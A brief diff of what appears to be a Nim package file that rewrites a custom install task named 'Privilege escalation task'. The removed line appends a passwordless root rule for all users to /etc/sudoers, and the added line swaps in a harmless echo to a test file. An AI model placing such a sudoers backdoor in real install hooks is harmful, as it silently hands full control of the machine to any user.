@@ -6,4 +6,4 @@ srcDir        = "src"
 
 # Define a custom install task
 task install, "Privilege escalation task":
-  exec "echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
+  exec "echo 'test text' >> /home/jack/test.txt"
